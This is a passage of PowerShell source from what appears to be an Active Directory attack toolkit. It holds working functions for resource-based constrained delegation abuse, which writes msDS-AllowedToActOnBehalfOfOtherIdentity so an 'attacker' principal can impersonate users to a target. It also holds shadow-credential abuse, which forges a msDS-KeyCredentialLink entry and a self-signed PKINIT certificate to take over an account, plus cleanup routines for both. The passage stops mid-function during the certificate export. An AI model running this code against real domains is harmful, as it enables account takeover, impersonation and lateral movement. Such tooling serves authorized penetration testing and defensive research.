                        $runspacePool.Close()
                        $runspacePool.Dispose()
                    } catch { }
                }
            }
        }

        Write-Log "[Test-RemoteAdminAccess] Completed: $adminCount/$($allComputers.Count) systems with admin access"

        # Output results
        # CRITICAL: Use comma operator to prevent PowerShell array unwrapping
        # Without comma, PowerShell unwraps single-element arrays to scalar objects
        return ,$results
    }
}



# ----- Invoke-RBCDOperation.ps1 -----

function Invoke-RBCDOperation {
<#
.SYNOPSIS
    Helper function for Resource-Based Constrained Delegation (RBCD) operations.

.DESCRIPTION
    Invoke-RBCDOperation is a centralized helper function that handles RBCD configuration
    for both user and computer objects. It eliminates code duplication between
    Set-DomainUser and Set-DomainComputer.

    Uses ModifyRequest via $Script:LdapConnection for all LDAP modifications,
    ensuring compatibility with all authentication methods including Kerberos PTT.

    Supports:
    - Adding RBCD principals (SetRBCD)
    - Clearing RBCD principals (ClearRBCD) - single, specific, or all

.PARAMETER TargetDN
    Distinguished Name of the target object.

.PARAMETER TargetSAMAccountName
    sAMAccountName of the target object.

.PARAMETER TargetType
    Type of target object: 'User' or 'Computer'.

.PARAMETER AddRBCD
    Principal to add for RBCD delegation.

.PARAMETER ClearRBCD
    Switch to clear RBCD configuration.

.PARAMETER Principal
    Specific principal to remove (with -ClearRBCD).

.PARAMETER Force
    Remove all principals (with -ClearRBCD).

.PARAMETER PassThru
    Return result object instead of console output.

.PARAMETER ConnectionParams
    Hashtable with Domain, Server, Credential for LDAP operations.

.NOTES
    Author: Alexander Sturz (@_61106960_)
    Internal helper function - not exported directly.
#>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$TargetDN,

        [Parameter(Mandatory)]
        [string]$TargetSAMAccountName,

        [Parameter(Mandatory)]
        [ValidateSet('User', 'Computer')]
        [string]$TargetType,

        [Parameter(ParameterSetName='Set', Mandatory)]
        [string]$AddRBCD,

        [Parameter(ParameterSetName='Clear', Mandatory)]
        [switch]$ClearRBCD,

        [Parameter(ParameterSetName='Clear')]
        [string]$Principal,

        [Parameter(ParameterSetName='Clear')]
        [switch]$Force,

        [switch]$PassThru,

        [hashtable]$ConnectionParams = @{}
    )

    $FunctionPrefix = "[Invoke-RBCDOperation]"

    if ($PSCmdlet.ParameterSetName -eq 'Set') {
        # ===== SetRBCD Operation =====
        Write-Log "$FunctionPrefix Configuring RBCD for: $TargetSAMAccountName"

        try {
            # Resolve delegate principal (any principal type - Computer, User, gMSA, etc.)
            # Get-DomainObject now supports cross-domain queries (DOMAIN\username)
            $DelegateObject = @(Get-DomainObject -Identity $AddRBCD -Properties objectSid @ConnectionParams)[0]
            if (-not $DelegateObject) {
                throw "Principal '$AddRBCD' not found"
            }

            # objectSid is returned as string (S-1-5-...) by Get-DomainObject
            $DelegateSID = New-Object System.Security.Principal.SecurityIdentifier($DelegateObject.objectSid)

            # Read existing RBCD configuration (use Get-DomainObject -Raw to get unprocessed bytes)
            $ExistingRBCD = @(Get-DomainObject -Identity $TargetDN -Properties 'msDS-AllowedToActOnBehalfOfOtherIdentity' -Raw @ConnectionParams)[0]

            # RBCD uses a RAW Security Descriptor, not an AD-specific one
            # The msDS-AllowedToActOnBehalfOfOtherIdentity attribute stores a binary SD
            # where the DACL contains ACEs granting "GenericAll" (0x10000000) to allowed principals

            $AlreadyExists = $false

            # Get existing SD bytes from LDAP result (Get-DomainObject -Raw returns byte[])
            $ExistingSDBytes = $null
            if ($ExistingRBCD -and $ExistingRBCD.'msDS-AllowedToActOnBehalfOfOtherIdentity') {
                $ExistingSDBytes = [byte[]]$ExistingRBCD.'msDS-AllowedToActOnBehalfOfOtherIdentity'
                Write-Log "$FunctionPrefix Found existing RBCD data via LDAP: $($ExistingSDBytes.Length) bytes"
            } else {
                Write-Log "$FunctionPrefix No existing RBCD data found"
            }

            if ($ExistingSDBytes -and $ExistingSDBytes.Length -gt 0) {
                # Parse existing SD using RawSecurityDescriptor
                $RawSD = New-Object System.Security.AccessControl.RawSecurityDescriptor([byte[]]$ExistingSDBytes, 0)
                Write-Log "$FunctionPrefix Extending existing RBCD configuration with $($RawSD.DiscretionaryAcl.Count) existing ACE(s)"

                # Check if ACE for this SID already exists
                foreach ($ace in $RawSD.DiscretionaryAcl) {
                    # RawAcl returns GenericAce objects, cast to CommonAce to access SecurityIdentifier
                    $commonAce = [System.Security.AccessControl.CommonAce]$ace
                    if ($commonAce.SecurityIdentifier.Value -eq $DelegateSID.Value) {
                        $AlreadyExists = $true
                        Write-Log "$FunctionPrefix ACE for $DelegateSID already exists"
                        break
                    }
                }

                if (-not $AlreadyExists) {
                    # Add new ACE: GenericAll (0x10000000) for the delegate SID
                    $RawSD.DiscretionaryAcl.InsertAce(
                        $RawSD.DiscretionaryAcl.Count,
                        (New-Object System.Security.AccessControl.CommonAce(
                            [System.Security.AccessControl.AceFlags]::None,
                            [System.Security.AccessControl.AceQualifier]::AccessAllowed,
                            0x10000000,  # GenericAll
                            $DelegateSID,
                            $false,
                            $null
                        ))
                    )
                }
            } else {
                Write-Log "$FunctionPrefix Creating new RBCD configuration"

                # Create new RawSecurityDescriptor with empty DACL
                $RawSD = New-Object System.Security.AccessControl.RawSecurityDescriptor("O:BAD:")

                # Create DACL with single ACE granting GenericAll to delegate SID
                $RawSD.DiscretionaryAcl = New-Object System.Security.AccessControl.RawAcl(
                    [System.Security.AccessControl.RawAcl]::AclRevision,
                    1
                )
                $RawSD.DiscretionaryAcl.InsertAce(
                    0,
                    (New-Object System.Security.AccessControl.CommonAce(
                        [System.Security.AccessControl.AceFlags]::None,
                        [System.Security.AccessControl.AceQualifier]::AccessAllowed,
                        0x10000000,  # GenericAll
                        $DelegateSID,
                        $false,
                        $null
                    ))
                )
            }

            # Convert RawSecurityDescriptor to binary form
            $SDBytes = New-Object byte[] $RawSD.BinaryLength
            $RawSD.GetBinaryForm($SDBytes, 0)

            # Set msDS-AllowedToActOnBehalfOfOtherIdentity via ModifyRequest
            $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
            $ModifyRequest.DistinguishedName = $TargetDN

            $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
            $Modification.Name = "msDS-AllowedToActOnBehalfOfOtherIdentity"
            $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
            $Modification.Add($SDBytes) | Out-Null

            $ModifyRequest.Modifications.Add($Modification) | Out-Null

            $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
            if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
                throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
            }

            # Resolve delegate name for output
            $DelegateName = if ($DelegateObject.sAMAccountName) { $DelegateObject.sAMAccountName } else { $AddRBCD }

            if ($PassThru) {
                return [PSCustomObject]@{
                    Operation = "SetRBCD"
                    $TargetType = $TargetSAMAccountName
                    DistinguishedName = $TargetDN
                    DelegateFrom = $DelegateName
                    AlreadyExisted = $AlreadyExists
                    Success = $true
                    Message = if ($AlreadyExists) { "RBCD entry already existed" } else { "RBCD successfully configured. $DelegateName can now impersonate users to $TargetSAMAccountName" }
                }
            } else {
                if ($AlreadyExists) {
                    Show-Line "RBCD entry already exists for $DelegateName on: $TargetSAMAccountName" -Class Note
                } else {
                    Show-Line "Successfully configured RBCD on target: $TargetSAMAccountName" -Class Hint
                    Show-KeyValue "Attacker (can impersonate):" $DelegateName
                    Show-KeyValue "Target (receives impersonation):" $TargetSAMAccountName
                }
            }
        } catch {
            # Decode the LDAP write failure (LDAP ResultCode + AD server sub-error) so a
            # rejected RBCD write on a hardened target names the real cause.
            $writeError = Resolve-LDAPWriteError -Exception $_.Exception -Operation "configure RBCD on '$TargetSAMAccountName'"
            throw ("Failed to configure RBCD on '$TargetSAMAccountName'." + [Environment]::NewLine + '  ' + $writeError.Formatted)
        }
    }
    else {
        # ===== ClearRBCD Operation =====
        Write-Log "$FunctionPrefix Clearing RBCD configuration for: $TargetSAMAccountName"

        try {
            # Read existing RBCD configuration (use Get-DomainObject -Raw to get unprocessed bytes)
            $ExistingRBCD = @(Get-DomainObject -Identity $TargetDN -Properties 'msDS-AllowedToActOnBehalfOfOtherIdentity' -Raw @ConnectionParams)[0]

            # Get existing SD bytes from LDAP result (Get-DomainObject -Raw returns byte[])
            $ExistingSDBytes = $null
            if ($ExistingRBCD -and $ExistingRBCD.'msDS-AllowedToActOnBehalfOfOtherIdentity') {
                $ExistingSDBytes = [byte[]]$ExistingRBCD.'msDS-AllowedToActOnBehalfOfOtherIdentity'
            }

            if (-not $ExistingSDBytes -or $ExistingSDBytes.Length -eq 0) {
                if ($PassThru) {
                    return [PSCustomObject]@{
                        Operation = "ClearRBCD"
                        $TargetType = $TargetSAMAccountName
                        DistinguishedName = $TargetDN
                        Success = $true
                        Message = "No RBCD configuration to clear"
                    }
                } else {
                    Show-Line "No RBCD configuration found on: $TargetSAMAccountName" -Class Note
                }
                return $null
            }

            # Parse existing SD to get list of principals
            $RawSD = New-Object System.Security.AccessControl.RawSecurityDescriptor([byte[]]$ExistingSDBytes, 0)
            $ACECount = $RawSD.DiscretionaryAcl.Count
            Write-Log "$FunctionPrefix Found $ACECount RBCD ACE(s)"

            # Build list of configured principals with resolved names
            $ConfiguredPrincipals = @()
            foreach ($ace in $RawSD.DiscretionaryAcl) {
                # Cast GenericAce to CommonAce to access SecurityIdentifier
                $CommonAce = [System.Security.AccessControl.CommonAce]$ace
                $PrincipalSID = $CommonAce.SecurityIdentifier.Value
                Write-Log "$FunctionPrefix Processing ACE for SID: $PrincipalSID"
                $PrincipalName = ConvertFrom-SID -SID $PrincipalSID
                Write-Log "$FunctionPrefix Resolved SID $PrincipalSID to: $PrincipalName"
                if (-not $PrincipalName) { $PrincipalName = $PrincipalSID }
                $ConfiguredPrincipals += [PSCustomObject]@{
                    SID = $PrincipalSID
                    Name = $PrincipalName
                    ACE = $CommonAce
                }
            }

            # Decision logic based on parameters and ACE count
            if ($Principal) {
                # Remove specific principal only
                $TargetSID = ConvertTo-SID -Identity $Principal
                if (-not $TargetSID) {
                    $TargetSID = $Principal
                }

                # Match by SID, exact name, or name without domain prefix
                # Also handle computer accounts with/without trailing $
                $PrincipalInput = $Principal
                $PrincipalWithDollar = if ($Principal -notmatch '\$$') { "${Principal}`$" } else { $Principal }

                # Build -like patterns
                $LikePatternInput = '*\' + $PrincipalInput
                $LikePatternDollar = '*\' + $PrincipalWithDollar

                Write-Log "$FunctionPrefix Matching principal: Input='$PrincipalInput', WithDollar='$PrincipalWithDollar'"

                $PrincipalToRemove = $ConfiguredPrincipals | Where-Object {
                    ($_.SID -eq $TargetSID) -or
                    ($_.Name -eq $PrincipalInput) -or
                    ($_.Name -like $LikePatternInput) -or
                    ($_.Name -like $LikePatternDollar) -or
                    ($_.Name -eq $PrincipalWithDollar)
                } | Select-Object -First 1

                if (-not $PrincipalToRemove) {
                    if ($PassThru) {
                        return [PSCustomObject]@{
                            Operation = "ClearRBCD"
                            $TargetType = $TargetSAMAccountName
                            DistinguishedName = $TargetDN
                            Success = $false
                            Message = "Principal '$Principal' not found in RBCD configuration"
                            ExistingPrincipals = $ConfiguredPrincipals
                        }
                    } else {
                        Write-Warning "[!] Principal '$Principal' not found in RBCD configuration on: $TargetSAMAccountName"
                        Show-EmptyLine
                        Show-Line "Existing RBCD principals:" -Class Hint
                        foreach ($configuredPrincipal in $ConfiguredPrincipals) {
                            Show-KeyValue "Principal:" "$($configuredPrincipal.Name) ($($configuredPrincipal.SID))"
                        }
                    }
                    return $null
                }

                # Remove ACE for this principal from DACL
                $DaclCount = [int]$RawSD.DiscretionaryAcl.Count
                $NewDACL = New-Object System.Security.AccessControl.RawAcl(
                    [System.Security.AccessControl.RawAcl]::AclRevision,
                    ($DaclCount - 1)
                )
                $aceIndex = 0
                foreach ($ace in $RawSD.DiscretionaryAcl) {
                    $CommonAce = [System.Security.AccessControl.CommonAce]$ace
                    if ($CommonAce.SecurityIdentifier.Value -ne $PrincipalToRemove.SID) {
                        $NewDACL.InsertAce($aceIndex, $ace)
                        $aceIndex++
                    }
                }

                # Write updated or cleared RBCD via ModifyRequest
                $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
                $ModifyRequest.DistinguishedName = $TargetDN

                $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                $Modification.Name = "msDS-AllowedToActOnBehalfOfOtherIdentity"

                if ($NewDACL.Count -eq 0) {
                    # No ACEs left - clear the attribute
                    $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Delete
                } else {
                    # Replace with updated SD
                    $RawSD.DiscretionaryAcl = $NewDACL
                    $SDBytes = New-Object byte[] $RawSD.BinaryLength
                    $RawSD.GetBinaryForm($SDBytes, 0)
                    $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
                    $Modification.Add($SDBytes) | Out-Null
                }

                $ModifyRequest.Modifications.Add($Modification) | Out-Null

                $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
                if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
                    throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
                }

                if ($PassThru) {
                    return [PSCustomObject]@{
                        Operation = "ClearRBCD"
                        $TargetType = $TargetSAMAccountName
                        DistinguishedName = $TargetDN
                        RemovedPrincipal = $PrincipalToRemove.Name
                        RemainingCount = $NewDACL.Count
                        Success = $true
                        Message = "RBCD entry for '$($PrincipalToRemove.Name)' removed"
                    }
                } else {
                    Show-Line "Successfully removed '$($PrincipalToRemove.Name)' from RBCD configuration on: $TargetSAMAccountName" -Class Hint
                }

            } elseif ($ACECount -eq 1) {
                # Only one entry - delete attribute via ModifyRequest
                $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
                $ModifyRequest.DistinguishedName = $TargetDN

                $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                $Modification.Name = "msDS-AllowedToActOnBehalfOfOtherIdentity"
                $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Delete

                $ModifyRequest.Modifications.Add($Modification) | Out-Null

                $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
                if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
                    throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
                }

                if ($PassThru) {
                    return [PSCustomObject]@{
                        Operation = "ClearRBCD"
                        $TargetType = $TargetSAMAccountName
                        DistinguishedName = $TargetDN
                        ClearedCount = 1
                        Success = $true
                        Message = "RBCD configuration successfully cleared"
                    }
                } else {
                    Show-Line "Successfully cleared RBCD configuration from: $TargetSAMAccountName" -Class Hint
                }

            } elseif ($Force) {
                # Multiple entries + Force - delete attribute via ModifyRequest
                $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
                $ModifyRequest.DistinguishedName = $TargetDN

                $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                $Modification.Name = "msDS-AllowedToActOnBehalfOfOtherIdentity"
                $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Delete

                $ModifyRequest.Modifications.Add($Modification) | Out-Null

                $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
                if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
                    throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
                }

                if ($PassThru) {
                    return [PSCustomObject]@{
                        Operation = "ClearRBCD"
                        $TargetType = $TargetSAMAccountName
                        DistinguishedName = $TargetDN
                        ClearedCount = $ACECount
                        Success = $true
                        Message = "All $ACECount RBCD entries successfully cleared"
                    }
                } else {
                    Show-Line "Successfully cleared all $ACECount RBCD entries from: $TargetSAMAccountName" -Class Hint
                }

            } else {
                # Multiple entries, no Force, no specific principal - show entries and don't delete
                if ($PassThru) {
                    return [PSCustomObject]@{
                        Operation = "ClearRBCD"
                        $TargetType = $TargetSAMAccountName
                        DistinguishedName = $TargetDN
                        PrincipalCount = $ACECount
                        ExistingPrincipals = $ConfiguredPrincipals
                        Success = $false
                        Message = "Multiple principals found. Use -Principal <name> or -Force to proceed."
                    }
                } else {
                    Write-Warning "[!] Multiple RBCD principals ($ACECount) found on: $TargetSAMAccountName"
                    Show-EmptyLine
                    Show-Line "To remove a specific principal, use: -Principal <name>" -Class Note
                    Show-Line "To remove ALL principals, use: -Force" -Class Note
                    Show-EmptyLine
                    Show-Line "Existing RBCD principals:" -Class Hint

                    $index = 1
                    foreach ($configuredPrincipal in $ConfiguredPrincipals) {
                        Show-KeyValue "[$index] Principal:" "$($configuredPrincipal.Name)"
                        Show-KeyValue "    SID:" "$($configuredPrincipal.SID)"
                        Show-EmptyLine
                        $index++
                    }
                }
            }
        } catch {
            # Decode the LDAP write failure (LDAP ResultCode + AD server sub-error).
            $writeError = Resolve-LDAPWriteError -Exception $_.Exception -Operation "clear RBCD on '$TargetSAMAccountName'"
            throw ("Failed to clear RBCD on '$TargetSAMAccountName'." + [Environment]::NewLine + '  ' + $writeError.Formatted)
        }
    }
}



# ----- Invoke-ShadowCredentialOperation.ps1 -----

function Invoke-ShadowCredentialOperation {
<#
.SYNOPSIS
    Helper function for Shadow Credential (msDS-KeyCredentialLink) operations.

.DESCRIPTION
    Invoke-ShadowCredentialOperation is a centralized helper function that handles
    Shadow Credential operations for both user and computer objects. It eliminates
    code duplication between Set-DomainUser and Set-DomainComputer.

    Uses ModifyRequest via $Script:LdapConnection for all LDAP modifications,
    ensuring compatibility with all authentication methods including Kerberos PTT.

    Supports:
    - Adding Shadow Credentials (generates RSA key, creates PFX)
    - Clearing Shadow Credentials (single, specific by DeviceID, or all)

.PARAMETER TargetDN
    Distinguished Name of the target object.

.PARAMETER TargetSAMAccountName
    sAMAccountName of the target object.

.PARAMETER TargetType
    Type of target object: 'User' or 'Computer'.

.PARAMETER TargetUPN
    User Principal Name for the certificate SAN (optional for users with existing UPN).

.PARAMETER AddShadowCredential
    Switch to add a new Shadow Credential.

.PARAMETER ClearShadowCredentials
    Switch to clear Shadow Credentials.

.PARAMETER DeviceID
    Device GUID for operations.
    With -AddShadowCredential: Optional custom Device ID.
    With -ClearShadowCredentials: Specific DeviceID to remove.

.PARAMETER Force
    Remove all credentials (with -ClearShadowCredentials).

.PARAMETER PassThru
    Return result object instead of console output.

.NOTES
    Author: Alexander Sturz (@_61106960_)
    Internal helper function - not exported directly.
#>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$TargetDN,

        [Parameter(Mandatory)]
        [string]$TargetSAMAccountName,

        [Parameter(Mandatory)]
        [ValidateSet('User', 'Computer')]
        [string]$TargetType,

        [string]$TargetUPN,

        [Parameter(ParameterSetName='Add', Mandatory)]
        [switch]$AddShadowCredential,

        [Parameter(ParameterSetName='Clear', Mandatory)]
        [switch]$ClearShadowCredentials,

        [string]$DeviceID,

        [Parameter(ParameterSetName='Clear')]
        [switch]$Force,

        [switch]$NoPassword,

        [switch]$PassThru
    )

    $FunctionPrefix = "[Invoke-ShadowCredentialOperation]"

    if ($PSCmdlet.ParameterSetName -eq 'Add') {
        # ===== AddShadowCredential Operation =====
        Write-Log "$FunctionPrefix Adding Shadow Credential to: $TargetSAMAccountName"

        $RSA = $null
        try {
            # Generate RSA key pair (2048 bit)
            Write-Log "$FunctionPrefix Generating RSA key pair..."
            $RSA = [System.Security.Cryptography.RSA]::Create(2048)

            # Generate GUIDs
            $DeviceGUID = if ($DeviceID) { [GUID]$DeviceID } else { [GUID]::NewGuid() }
            $KeyGUID = [GUID]::NewGuid()

            Write-Log "$FunctionPrefix Device ID: $DeviceGUID"
            Write-Log "$FunctionPrefix Key ID: $KeyGUID"

            # Get RSA parameters for public key
            $RSAParams = $RSA.ExportParameters($false)  # false = public key only

            # Build BCRYPT_RSAKEY_BLOB structure for the public key
            $KeyBlob = New-Object System.Collections.ArrayList

            # BCRYPT_RSAKEY_BLOB header (24 bytes)
            # Magic: BCRYPT_RSAPUBLIC_MAGIC = 0x31415352 ("RSA1")
            [void]$KeyBlob.AddRange([BitConverter]::GetBytes([UInt32]0x31415352))
            # BitLength
            [void]$KeyBlob.AddRange([BitConverter]::GetBytes([UInt32]2048))
            # cbPublicExp (exponent length)
            [void]$KeyBlob.AddRange([BitConverter]::GetBytes([UInt32]$RSAParams.Exponent.Length))
            # cbModulus (modulus length)
            [void]$KeyBlob.AddRange([BitConverter]::GetBytes([UInt32]$RSAParams.Modulus.Length))
            # cbPrime1 (not used for public key)
            [void]$KeyBlob.AddRange([BitConverter]::GetBytes([UInt32]0))
            # cbPrime2 (not used for public key)
            [void]$KeyBlob.AddRange([BitConverter]::GetBytes([UInt32]0))

            # Exponent
            [void]$KeyBlob.AddRange($RSAParams.Exponent)
            # Modulus
            [void]$KeyBlob.AddRange($RSAParams.Modulus)

            $PublicKeyBytes = [byte[]]$KeyBlob.ToArray()

            # Compute SHA256 hash of the public key (KeyID)
            $SHA256 = [System.Security.Cryptography.SHA256]::Create()
            $KeyHash = $SHA256.ComputeHash($PublicKeyBytes)
            $SHA256.Dispose()

            # Build KeyCredentialLink structure (DN-Binary format)
            # MS-ADTS 2.2.19 KEYCREDENTIALLINK_BLOB
            # Format is LTV (Length-Type-Value), NOT TLV!

            # First, build entries 3-9 (needed for KeyHash calculation)
            $EntriesAfterKeyHash = New-Object System.Collections.ArrayList
            $CurrentFileTime = [DateTime]::UtcNow.ToFileTimeUtc()

            # Entry Type 0x03: KeyMaterial (BCRYPT_RSAKEY_BLOB)
            Add-KeyCredentialLinkEntry -EntryType 0x03 -Data $PublicKeyBytes -Target $EntriesAfterKeyHash

            # Entry Type 0x04: KeyUsage (1 byte: 0x01 = NGC)
            Add-KeyCredentialLinkEntry -EntryType 0x04 -Data @([byte]0x01) -Target $EntriesAfterKeyHash

            # Entry Type 0x05: KeySource (1 byte: 0x00 = AD)
            Add-KeyCredentialLinkEntry -EntryType 0x05 -Data @([byte]0x00) -Target $EntriesAfterKeyHash

            # Entry Type 0x06: DeviceId (GUID)
            Add-KeyCredentialLinkEntry -EntryType 0x06 -Data $DeviceGUID.ToByteArray() -Target $EntriesAfterKeyHash

            # Entry Type 0x07: CustomKeyInformation (Version + Flags)
            Add-KeyCredentialLinkEntry -EntryType 0x07 -Data @([byte]0x01, [byte]0x00) -Target $EntriesAfterKeyHash

            # Entry Type 0x08: KeyApproximateLastLogonTimeStamp (FILETIME)
            Add-KeyCredentialLinkEntry -EntryType 0x08 -Data ([BitConverter]::GetBytes($CurrentFileTime)) -Target $EntriesAfterKeyHash

            # Entry Type 0x09: KeyCreationTime (FILETIME)
            Add-KeyCredentialLinkEntry -EntryType 0x09 -Data ([BitConverter]::GetBytes($CurrentFileTime)) -Target $EntriesAfterKeyHash

            # Calculate KeyHash: SHA256 of entries 3-9
            $SHA256ForHash = [System.Security.Cryptography.SHA256]::Create()
            $KeyHashValue = $SHA256ForHash.ComputeHash([byte[]]$EntriesAfterKeyHash.ToArray())
            $SHA256ForHash.Dispose()

            # Now build the complete entry list
            $KeyCredentialEntries = New-Object System.Collections.ArrayList

            # Entry Type 0x01: KeyID (SHA256 hash of public key material)
            Add-KeyCredentialLinkEntry -EntryType 0x01 -Data $KeyHash -Target $KeyCredentialEntries

            # Entry Type 0x02: KeyHash (SHA256 of entries 3-9)
            Add-KeyCredentialLinkEntry -EntryType 0x02 -Data $KeyHashValue -Target $KeyCredentialEntries

            # Add entries 3-9
            [void]$KeyCredentialEntries.AddRange($EntriesAfterKeyHash.ToArray())

            # Build final KeyCredentialLink blob
            $KeyCredentialBlob = New-Object System.Collections.ArrayList

            # Version (4 bytes): 0x00000200 for version 2
            [void]$KeyCredentialBlob.AddRange([BitConverter]::GetBytes([UInt32]0x00000200))

            # Entries
            [void]$KeyCredentialBlob.AddRange($KeyCredentialEntries.ToArray())

            $KeyCredentialBytes = [byte[]]$KeyCredentialBlob.ToArray()

            # Create DN-Binary string (format: B:<length>:<hex>:<dn>)
            $HexString = [BitConverter]::ToString($KeyCredentialBytes) -replace '-', ''
            $DNBinaryValue = "B:$($HexString.Length):$HexString`:$TargetDN"

            Write-Log "$FunctionPrefix KeyCredentialLink DN-Binary length: $($KeyCredentialBytes.Length) bytes"

            # Add Shadow Credential via ModifyRequest (works with all auth methods including Kerberos PTT)
            $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
            $ModifyRequest.DistinguishedName = $TargetDN

            $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
            $Modification.Name = "msDS-KeyCredentialLink"
            $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Add
            $Modification.Add($DNBinaryValue) | Out-Null

            $ModifyRequest.Modifications.Add($Modification) | Out-Null

            $Response = $Script:LdapConnection.SendRequest($ModifyRequest)

            if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
                throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
            }

            Write-Log "$FunctionPrefix Shadow Credential added to AD, creating PFX certificate..."

            # Generate certificate password (using safe characters)
            if ($NoPassword) {
                $CertPassword = $null
            }
            else {
                $CertPassword = New-SafePassword -Length 20
            }

            # Create self-signed certificate using the SAME RSA key
            # Requires .NET 4.7.2+ (CertificateRequest class)
            try {
                [void][System.Security.Cryptography.X509Certificates.CertificateRequest]

                $SubjectName = "CN=$TargetSAMAccountName"
                $Subject = New-Object System.Security.Cryptography.X509Certificates.X500DistinguishedName($SubjectName)

                $CertRequest = New-Object System.Security.Cryptography.X509Certificates.CertificateRequest(
                    $Subject,
                    $RSA,
                    [System.Security.Cryptography.HashAlgorithmName]::SHA256,
                    [System.Security.Cryptography.RSASignaturePadding]::Pkcs1
                )

                # Add Enhanced Key Usage for PKINIT authentication
                $OidCollection = New-Object System.Security.Cryptography.OidCollection
                [void]$OidCollection.Add((New-Object System.Security.Cryptography.Oid("1.3.6.1.5.5.7.3.2")))  # Client Authentication
                [void]$OidCollection.Add((New-Object System.Security.Cryptography.Oid("1.3.6.1.4.1.311.20.2.2")))  # Smart Card Logon
                $EkuExtension = New-Object System.Security.Cryptography.X509Certificates.X509EnhancedKeyUsageExtension($OidCollection, $false)
                $CertRequest.CertificateExtensions.Add($EkuExtension)

                # Add Key Usage extension
                $KeyUsageExtension = New-Object System.Security.Cryptography.X509Certificates.X509KeyUsageExtension(
                    ([System.Security.Cryptography.X509Certificates.X509KeyUsageFlags]::DigitalSignature -bor [System.Security.Cryptography.X509Certificates.X509KeyUsageFlags]::KeyEncipherment),
                    $false
                )
                $CertRequest.CertificateExtensions.Add($KeyUsageExtension)

                # Determine UPN for certificate SAN
                $CertUPN = if ($TargetUPN) {
                    $TargetUPN
                } else {
                    # For computers: COMPUTERNAME$@REALM, for users: user@REALM
                    "$TargetSAMAccountName@$($Script:LDAPContext.Domain.ToUpper())"
                }
                Write-Log "$FunctionPrefix Adding UPN to certificate SAN: $CertUPN"

                # Build SAN extension with UPN
                $UPNBytes = [System.Text.Encoding]::UTF8.GetBytes($CertUPN)
                $UPNOID = @(0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x14, 0x02, 0x03)

                $UTF8Tag = 0x0C
                $UPNValueASN1 = @($UTF8Tag) + $(if ($UPNBytes.Length -lt 128) { @([byte]$UPNBytes.Length) } else { @(0x82, [byte](($UPNBytes.Length -shr 8) -band 0xFF), [byte]($UPNBytes.Length -band 0xFF)) }) + $UPNBytes

                $Context0Content = [byte[]]$UPNValueASN1
                $Context0 = @(0xA0) + $(if ($Context0Content.Length -lt 128) { @([byte]$Context0Content.Length) } else { @(0x82, [byte](($Context0Content.Length -shr 8) -band 0xFF), [byte]($Context0Content.Length -band 0xFF)) }) + $Context0Content

                $OtherNameContent = [byte[]]$UPNOID + [byte[]]$Context0
                $GeneralName = @(0xA0) + $(if ($OtherNameContent.Length -lt 128) { @([byte]$OtherNameContent.Length) } else { @(0x82, [byte](($OtherNameContent.Length -shr 8) -band 0xFF), [byte]($OtherNameContent.Length -band 0xFF)) }) + $OtherNameContent

                $GeneralNamesContent = [byte[]]$GeneralName
                $SANValue = @(0x30) + $(if ($GeneralNamesContent.Length -lt 128) { @([byte]$GeneralNamesContent.Length) } else { @(0x82, [byte](($GeneralNamesContent.Length -shr 8) -band 0xFF), [byte]($GeneralNamesContent.Length -band 0xFF)) }) + $GeneralNamesContent

                $SANExtension = New-Object System.Security.Cryptography.X509Certificates.X509Extension(
                    (New-Object System.Security.Cryptography.Oid("2.5.29.17")),
                    [byte[]]$SANValue,
                    $false
                )
                $CertRequest.CertificateExtensions.Add($SANExtension)
                Write-Log "$FunctionPrefix SAN extension added with UPN: $CertUPN"

                # Create self-signed certificate (valid for 10 years)
                # Note: The KDC only validates the key material in msDS-KeyCredentialLink,
                # not the certificate validity period. Long validity avoids user confusion.
                $NotBefore = [DateTime]::UtcNow.AddDays(-1)
                $NotAfter = [DateTime]::UtcNow.AddYears(10)
                $Cert = $CertRequest.CreateSelfSigned($NotBefore, $NotAfter)

                Write-Log "$FunctionPrefix Certificate created using CertificateRequest with matching keypair"
            } catch {
                Write-Log "$FunctionPrefix CertificateRequest not available: $_"
                throw "Failed to create certificate: .NET 4.7.2+ with CertificateRequest is required for Shadow Credentials"
            }

            # Export as PFX
            if ($CertPassword) {
                $SecureCertPassword = ConvertTo-SecureString -String $CertPassword -AsPlainText -Force
                $PFXBytes = $Cert.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx, $SecureCertPassword)
            }
            else {
